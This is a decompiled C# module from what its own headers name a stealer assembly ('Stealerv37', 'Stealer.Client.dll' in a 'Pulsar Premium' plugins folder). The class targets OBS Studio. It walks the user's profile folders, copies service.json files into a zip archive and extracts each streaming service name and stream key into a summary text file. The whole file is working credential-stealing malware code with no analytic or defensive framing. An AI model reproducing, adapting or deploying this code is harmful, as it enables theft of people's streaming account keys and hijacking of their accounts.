// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Obs
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Applications;

public class Obs : ITarget
{
  private static readonly Regex SettingsRe = new Regex("\"settings\"\\s*:\\s*\\{(?<s>.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);
  private static readonly Regex ServiceRe = new Regex("\"service\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);
  private static readonly Regex KeyRe = new Regex("\"key\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "obs-studio", "basic", "profiles");
    if (!Directory.Exists(path1))
      return;
    string[] jsonFiles = new string[2]
    {
      "service.json",
      "service.json.bak"
    };
    ConcurrentBag<string> infoLines = new ConcurrentBag<string>();
    string[] directories = Directory.GetDirectories(path1);
    if (directories.Length == 0)
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "OBS";
    Parallel.ForEach<string>((IEnumerable<string>) directories, (Action<string>) (profileDir =>
    {
      string str1 = Path.GetFileName(profileDir) ?? profileDir;
      foreach (string path2 in jsonFiles)
      {
        string path3 = Path.Combine(profileDir, path2);
        if (File.Exists(path3))
        {
          string input1 = File.ReadAllText(path3, Encoding.UTF8);
          string entryPath = $"OBS\\{str1}\\{path2}";
          zip.AddFile(entryPath, File.ReadAllBytes(path3));
          counterApplications.Files.Add($"{path3} => {entryPath}");
          Match match = Obs.SettingsRe.Match(input1);
          string input2 = match.Success ? match.Groups["s"].Value : input1;
          string str2 = Obs.ServiceRe.Match(input2).Groups["v"].Value;
          string str3 = Obs.KeyRe.Match(input2).Groups["v"].Value;
          if (!string.IsNullOrEmpty(str2) || !string.IsNullOrEmpty(str3))
            infoLines.Add($"Profile:{str1} | File:{path2} | Service:{str2} | Key:{str3}");
        }
      }
    }));
    if (infoLines.Any<string>())
    {
      string entryPath = "OBS\\OBS_ServiceKeys.txt";
      zip.AddTextFile(entryPath, string.Join(Environment.NewLine, (IEnumerable<string>) infoLines));
      counterApplications.Files.Add(entryPath);
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counter.Applications.Add(counterApplications);
  }
}
